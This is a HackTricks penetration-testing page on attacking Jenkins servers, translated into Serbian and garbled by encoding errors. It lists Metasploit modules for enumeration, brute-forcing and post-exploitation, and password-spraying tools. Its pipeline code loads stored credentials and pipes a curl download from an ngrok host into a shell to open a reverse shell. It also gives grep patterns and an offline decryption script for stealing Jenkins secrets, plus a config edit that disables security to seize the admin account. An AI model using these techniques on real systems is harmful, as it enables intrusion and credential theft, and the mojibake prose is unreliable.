# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Jenkins je alat koji nudi jednostavan naÄin za uspostavljanje **kontinuirane integracije** ili **kontinuirane isporuke** (CI/CD) okruÅ¾enja za gotovo **bilo koju** kombinaciju **programskih jezika** i repozitorijuma izvornog koda koristeÄ‡i pipeline-ove. Pored toga, automatizuje razne rutinske razvojne zadatke. Iako Jenkins ne eliminiÅ¡e **potrebu za kreiranjem skripti za pojedinaÄne korake**, pruÅ¾a brÅ¾i i robusniji naÄin za integraciju celokupnog niza alata za izgradnju, testiranje i implementaciju nego Å¡to se moÅ¾e lako konstruisati ruÄno.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

Da biste pretraÅ¾ivali zanimljive Jenkins stranice bez autentifikacije kao Å¡to su (_/people_ ili _/asynchPeople_, ovo prikazuje trenutne korisnike) moÅ¾ete koristiti:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Proverite da li moÅ¾ete izvrÅ¡avati komande bez potrebe za autentifikacijom:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Bez kredencijala moÅ¾ete pogledati unutar _**/asynchPeople/**_ putanje ili _**/securityRealm/user/admin/search/index?q=**_ za **korisniÄka imena**.

MoÅ¾da Ä‡ete moÄ‡i da dobijete verziju Jenkins-a iz putanje _**/oops**_ ili _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Poznate ranjivosti

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Prijava

U osnovnim informacijama moÅ¾ete proveriti **sve naÄine za prijavu unutar Jenkins-a**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registracija

MoÄ‡i Ä‡ete da pronaÄ‘ete Jenkins instance koje **omoguÄ‡avaju kreiranje naloga i prijavu unutar njih. Tako jednostavno.**

### **SSO Prijava**

TakoÄ‘e, ako su **SSO** **funkcionalnosti**/**pluginovi** bili prisutni, onda biste trebali pokuÅ¡ati da se **prijavite** u aplikaciju koristeÄ‡i test nalog (npr., test **Github/Bitbucket nalog**). Trik iz [**ovde**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** nema **politiku lozinki** i **mitigaciju brute-force napada na korisniÄka imena**. Bitno je **brute-force** korisnike jer se mogu koristiti **slabe lozinke** ili **korisniÄka imena kao lozinke**, Äak i **obrnuta korisniÄka imena kao lozinke**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Koristite [ovaj python skript](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ili [ovaj powershell skript](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Mnoge organizacije kombinuju **SaaS-based source control management (SCM) systems** kao Å¡to su GitHub ili GitLab sa **internim, samostalno hostovanim CI** reÅ¡enjem poput Jenkins-a ili TeamCity-a. Ova postavka omoguÄ‡ava CI sistemima da **prijemaju webhook dogaÄ‘aje od SaaS provajdera za kontrolu izvora**, prvenstveno za pokretanje pipeline poslova.

Da bi to postigle, organizacije **stavljaju na belu listu** **IP opsege** **SCM platformi**, omoguÄ‡avajuÄ‡i im pristup **internom CI sistemu** putem **webhook-a**. MeÄ‘utim, vaÅ¾no je napomenuti da **bilo ko** moÅ¾e da kreira **nalog** na GitHub-u ili GitLab-u i konfiguriÅ¡e ga da **pokrene webhook**, potencijalno Å¡aljuÄ‡i zahteve **internom CI sistemu**.

Proverite: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale//)

## Internal Jenkins Abuses

U ovim scenarijima pretpostaviÄ‡emo da imate vaÅ¾eÄ‡i nalog za pristup Jenkins-u.

{% hint style="warning" %}
U zavisnosti od **Authorization** mehanizma konfiguranog u Jenkins-u i dozvola kompromitovanog korisnika **moÅ¾da Ä‡ete moÄ‡i ili ne moÄ‡i da izvrÅ¡ite sledeÄ‡e napade.**
{% endhint %}

Za viÅ¡e informacija proverite osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Ako ste pristupili Jenkins-u, moÅ¾ete da navedete druge registrovane korisnike na [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Koristite [ovaj skript](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) da izbacite izlaze konzole gradnje i varijable okruÅ¾enja gradnje kako biste se nadali da Ä‡ete pronaÄ‡i tajne u Äistom tekstu.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **KraÄ‘a SSH kredencijala**

Ako kompromitovani korisnik ima **dovoljno privilegija da kreira/modifikuje novi Jenkins Ävor** i SSH kredencijali su veÄ‡ saÄuvani za pristup drugim Ävorovima, on bi mogao **ukrasti te kredencijale** kreiranjem/modifikovanjem Ävora i **postavljanjem hosta koji Ä‡e snimati kredencijale** bez verifikacije host kljuÄa:

![](<../../.gitbook/assets/image (218).png>)

ObiÄno Ä‡ete pronaÄ‡i Jenkins ssh kredencijale u **globalnom provajderu** (`/credentials/`), tako da ih moÅ¾ete i dumpovati kao Å¡to biste dumpovali bilo koju drugu tajnu. ViÅ¡e informacija u [**odeljku o dumpovanju tajni**](./#dumping-secrets).

### **RCE u Jenkins-u**

Dobijanje **shell-a na Jenkins serveru** daje napadaÄu priliku da ukrade sve **tajne** i **env varijable** i da **iskoristi druge maÅ¡ine** locirane u istoj mreÅ¾i ili Äak **prikupi cloud kredencijale**.

Podrazumevano, Jenkins Ä‡e **raditi kao SYSTEM**. Tako da, kompromitovanje njega Ä‡e napadaÄu dati **SYSTEM privilegije**.

### **RCE Kreiranje/Modifikovanje projekta**

Kreiranje/Modifikovanje projekta je naÄin da se dobije RCE nad Jenkins serverom:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE IzvrÅ¡avanje Groovy skripte**

TakoÄ‘e moÅ¾ete dobiti RCE izvrÅ¡avanjem Groovy skripte, koja moÅ¾e biti manje uoÄljiva od kreiranja novog projekta:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Kreiranje/Modifikovanje Pipeline-a

TakoÄ‘e moÅ¾ete dobiti **RCE kreiranjem/modifikovanjem pipeline-a**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Eksploatacija Pipeline-a

Da biste eksploatisali pipeline-ove, joÅ¡ uvek morate imati pristup Jenkins-u.

### Build Pipeline-ovi

**Pipeline-ovi** se takoÄ‘e mogu koristiti kao **mehanizam za izgradnju u projektima**, u tom sluÄaju moÅ¾e se konfigurisati **fajl unutar repozitorijuma** koji Ä‡e sadrÅ¾ati sintaksu pipeline-a. Podrazumevano se koristi `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

TakoÄ‘e je moguÄ‡e **Äuvati konfiguracione fajlove pipeline-a na drugim mestima** (na primer, u drugim repozitorijumima) sa ciljem **razdvajanja** pristupa repozitorijumu i pristupa pipeline-u.

Ako napadaÄ ima **pravo pisanja nad tim fajlom**, moÄ‡i Ä‡e da **modifikuje** i **potencijalno pokrene** pipeline bez Äak i pristupa Jenkins-u.\
MoguÄ‡e je da Ä‡e napadaÄ morati da **obiÄ‘e neke zaÅ¡tite grana** (u zavisnosti od platforme i privilegija korisnika, one se mogu obiÄ‡i ili ne).

NajÄeÅ¡Ä‡i okidaÄi za izvrÅ¡avanje prilagoÄ‘enog pipeline-a su:

* **Pull request** na glavnu granu (ili potencijalno na druge grane)
* **Push na glavnu granu** (ili potencijalno na druge grane)
* **AÅ¾uriranje glavne grane** i Äekanje da se izvrÅ¡i na neki naÄin

{% hint style="info" %}
Ako ste **spoljaÅ¡nji korisnik**, ne biste trebali oÄekivati da kreirate **PR na glavnu granu** repozitorijuma **drugog korisnika/organizacije** i **pokrenete pipeline**... ali ako je **loÅ¡e konfigurisano**, mogli biste potpuno **kompromitovati kompanije samo eksploatacijom ovoga**.
{% endhint %}

### Pipeline RCE

U prethodnom RCE odeljku veÄ‡ je naznaÄena tehnika za [**dobijanje RCE modifikovanjem pipeline-a**](./#rce-creating-modifying-pipeline).

### Proveravanje Env varijabli

MoguÄ‡e je deklarisati **env varijable u Äistom tekstu** za ceo pipeline ili za specifiÄne faze. Ove env varijable **ne bi trebale sadrÅ¾ati osetljive informacije**, ali napadaÄ uvek moÅ¾e **proveriti sve konfiguracije pipeline-a/Jenkinsfile-ova:**
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Za informacije o tome kako se tajne obiÄno tretiraju u Jenkinsu, pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Akreditivi mogu biti **ograniÄeni na globalne provajdere** (`/credentials/`) ili na **specifiÄne projekte** (`/job/<project-name>/configure`). Stoga, da biste exfiltrirali sve njih, morate **kompromitovati barem sve projekte** koji sadrÅ¾e tajne i izvrÅ¡iti prilagoÄ‘ene/otrovane pipeline-ove.

Postoji joÅ¡ jedan problem, da biste dobili **tajnu unutar env** pipeline-a, morate **znati ime i tip tajne**. Na primer, ako pokuÅ¡ate da **uÄitate** **`usernamePassword`** **tajnu** kao **`string`** **tajnu**, dobiÄ‡ete ovu **greÅ¡ku**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Evo kako da uÄitate neke uobiÄajene tipove tajni:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Na kraju ove stranice moÅ¾ete **pronaÄ‡i sve tipove kredencijala**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Najbolji naÄin da **izvuÄete sve tajne odjednom** je da **kompromitujete** **Jenkins** maÅ¡inu (na primer, pokretanjem reverzne ljuske u **ugraÄ‘enom Ävoru**) i zatim **procurite** **master kljuÄeve** i **Å¡ifrovane tajne** i deÅ¡ifrujete ih offline.\
ViÅ¡e o tome kako to uraditi u [odeljku ÄŒvorovi i Agenti](./#nodes-and-agents) i u [odeljku Post Eksploatacija](./#post-exploitation).
{% endhint %}

### OkidaÄi

Iz [dokumentacije](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Direktiva `triggers` definiÅ¡e **automatske naÄine na koje bi Pipeline trebao biti ponovo aktiviran**. Za Pipelines koji su integrisani sa izvorom kao Å¡to su GitHub ili BitBucket, `triggers` moÅ¾da neÄ‡e biti potrebni jer Ä‡e integracija zasnovana na webhook-ovima verovatno veÄ‡ biti prisutna. Trenutno dostupni okidaÄi su `cron`, `pollSCM` i `upstream`.

Primer crona:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **Ğ´Ñ€ÑƒĞ³Ğµ Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€Ğµ Ñƒ Ğ´Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚Ğ°Ñ†Ğ¸Ñ˜Ğ¸**.

### ĞĞ¾Ğ´Ğ¾Ğ²Ğ¸ & ĞĞ³ĞµĞ½Ñ‚Ğ¸

**Jenkins Ğ¸Ğ½ÑÑ‚Ğ°Ğ½Ñ†Ğ°** Ğ¼Ğ¾Ğ¶Ğµ Ğ¸Ğ¼Ğ°Ñ‚Ğ¸ **Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğµ Ğ°Ğ³ĞµĞ½Ñ‚Ğµ ĞºĞ¾Ñ˜Ğ¸ Ñ€Ğ°Ğ´Ğµ Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸Ğ¼ Ğ¼Ğ°ÑˆĞ¸Ğ½Ğ°Ğ¼Ğ°**. Ğ˜Ğ· Ğ¿ĞµÑ€ÑĞ¿ĞµĞºÑ‚Ğ¸Ğ²Ğµ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ°, Ğ¿Ñ€Ğ¸ÑÑ‚ÑƒĞ¿ Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸Ğ¼ Ğ¼Ğ°ÑˆĞ¸Ğ½Ğ°Ğ¼Ğ° Ğ·Ğ½Ğ°Ñ‡Ğ¸ **Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğµ Ğ¿Ğ¾Ñ‚ĞµĞ½Ñ†Ğ¸Ñ˜Ğ°Ğ»Ğ½Ğµ Ğ¾Ğ±Ğ»Ğ°Ñ‡Ğ½Ğµ ĞºÑ€ĞµĞ´ĞµĞ½Ñ†Ğ¸Ñ˜Ğ°Ğ»Ğµ** Ğ·Ğ° ĞºÑ€Ğ°Ñ’Ñƒ Ğ¸Ğ»Ğ¸ **Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚ Ğ¼Ñ€ĞµĞ¶Ğ½Ğ¸ Ğ¿Ñ€Ğ¸ÑÑ‚ÑƒĞ¿** ĞºĞ¾Ñ˜Ğ¸ Ğ±Ğ¸ Ğ¼Ğ¾Ğ³Ğ°Ğ¾ Ğ±Ğ¸Ñ‚Ğ¸ Ğ·Ğ»Ğ¾ÑƒĞ¿Ğ¾Ñ‚Ñ€ĞµĞ±Ñ™ĞµĞ½ Ğ·Ğ° ĞµĞºÑĞ¿Ğ»Ğ¾Ğ°Ñ‚Ğ°Ñ†Ğ¸Ñ˜Ñƒ Ğ´Ñ€ÑƒĞ³Ğ¸Ñ… Ğ¼Ğ°ÑˆĞ¸Ğ½Ğ°.

Ğ—Ğ° Ğ²Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ° Ğ¿Ğ¾Ğ³Ğ»ĞµĞ´Ğ°Ñ˜Ñ‚Ğµ Ğ¾ÑĞ½Ğ¾Ğ²Ğ½Ğµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğµ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ĞœĞ¾Ğ¶ĞµÑ‚Ğµ Ğ½Ğ°Ğ±Ñ€Ğ¾Ñ˜Ğ°Ñ‚Ğ¸ **ĞºĞ¾Ğ½Ñ„Ğ¸Ğ³ÑƒÑ€Ğ¸ÑĞ°Ğ½Ğµ Ğ½Ğ¾Ğ´Ğ¾Ğ²Ğµ** Ñƒ `/computer/`, Ğ¾Ğ±Ğ¸Ñ‡Ğ½Ğ¾ Ñ›ĞµÑ‚Ğµ Ğ½Ğ°Ñ›Ğ¸ **`Built-In Node`** (ÑˆÑ‚Ğ¾ Ñ˜Ğµ Ğ½Ğ¾Ğ´ ĞºĞ¾Ñ˜Ğ¸ Ğ¿Ğ¾ĞºÑ€ĞµÑ›Ğµ Jenkins) Ğ¸ Ğ¿Ğ¾Ñ‚ĞµĞ½Ñ†Ğ¸Ñ˜Ğ°Ğ»Ğ½Ğ¾ Ğ²Ğ¸ÑˆĞµ:

![](<../../.gitbook/assets/image (249).png>)

**ĞŸĞ¾ÑĞµĞ±Ğ½Ğ¾ Ñ˜Ğµ Ğ·Ğ°Ğ½Ğ¸Ğ¼Ñ™Ğ¸Ğ²Ğ¾ ĞºĞ¾Ğ¼Ğ¿Ñ€Ğ¾Ğ¼Ğ¸Ñ‚Ğ¾Ğ²Ğ°Ñ‚Ğ¸ Built-In Ğ½Ğ¾Ğ´** Ñ˜ĞµÑ€ ÑĞ°Ğ´Ñ€Ğ¶Ğ¸ Ğ¾ÑĞµÑ‚Ñ™Ğ¸Ğ²Ğµ Jenkins Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğµ.

Ğ”Ğ° Ğ±Ğ¸ÑÑ‚Ğµ ÑƒĞºĞ°Ğ·Ğ°Ğ»Ğ¸ Ğ´Ğ° Ğ¶ĞµĞ»Ğ¸Ñ‚Ğµ Ğ´Ğ° **Ğ¸Ğ·Ğ²Ñ€ÑˆĞ¸Ñ‚Ğµ** **pipeline** Ñƒ **Ğ²Ğ³Ñ€Ğ°Ñ’ĞµĞ½Ğ¾Ğ¼ Jenkins Ğ½Ğ¾Ğ´Ñƒ**, Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ ÑĞ¿ĞµÑ†Ğ¸Ñ„Ğ¸Ñ†Ğ¸Ñ€Ğ°Ñ‚Ğ¸ ÑƒĞ½ÑƒÑ‚Ğ°Ñ€ pipeline ÑĞ»ĞµĞ´ĞµÑ›Ñƒ ĞºĞ¾Ğ½Ñ„Ğ¸Ğ³ÑƒÑ€Ğ°Ñ†Ğ¸Ñ˜Ñƒ:
```bash
pipeline {
agent {label 'built-in'}
```
### Potpuni primer

Pipeline u specifiÄnom agentu, sa cron okidaÄem, sa pipeline i stage env varijablama, uÄitavajuÄ‡i 2 varijable u koraku i Å¡aljuÄ‡i reverznu ljusku:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Tajne

MoÅ¾ete nabrojati tajne pristupajuÄ‡i `/credentials/` ako imate dovoljno dozvola. Imajte na umu da Ä‡e ovo samo nabrojati tajne unutar `credentials.xml` datoteke, ali **datoteke za konfiguraciju gradnje** takoÄ‘e mogu imati **viÅ¡e kredencijala**.

Ako moÅ¾ete **videti konfiguraciju svakog projekta**, takoÄ‘e moÅ¾ete videti imena **kredencijala (tajni)** koji se koriste za pristup repozitorijumu i **druge kredencijale projekta**.

![](<../../.gitbook/assets/image (180).png>)

#### Iz Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Iz diska

Ove datoteke su potrebne za **deÅ¡ifrovanje Jenkins tajni**:

* secrets/master.key
* secrets/hudson.util.Secret

Takve **tajne se obiÄno mogu naÄ‡i u**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Evo regex-a da ih pronaÄ‘ete:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Ako ste izvadili **potrebne lozinke za deÅ¡ifrovanje tajni**, koristite [**ovaj skript**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **da deÅ¡ifrujete te tajne**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### DeÅ¡ifrovanje Jenkins tajni iz Groovy-a
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Kreirajte novog admin korisnika

1. Pristupite Jenkins config.xml datoteci u `/var/lib/jenkins/config.xml` ili `C:\Program Files (x86)\Jenkins\`
2. PotraÅ¾ite reÄ `<useSecurity>true</useSecurity>` i promenite reÄ **`true`** u **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restartujte** **Jenkins** server: `service jenkins restart`
4. Sada ponovo idite na Jenkins portal i **Jenkins neÄ‡e traÅ¾iti nikakve kredencijale** ovaj put. Navigirajte do "**Manage Jenkins**" da ponovo postavite **administratorsku lozinku**.
5. **Ponovo omoguÄ‡ite** **bezbednost** promenom postavki na `<useSecurity>true</useSecurity>` i **ponovo restartujte Jenkins**.

## Reference

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
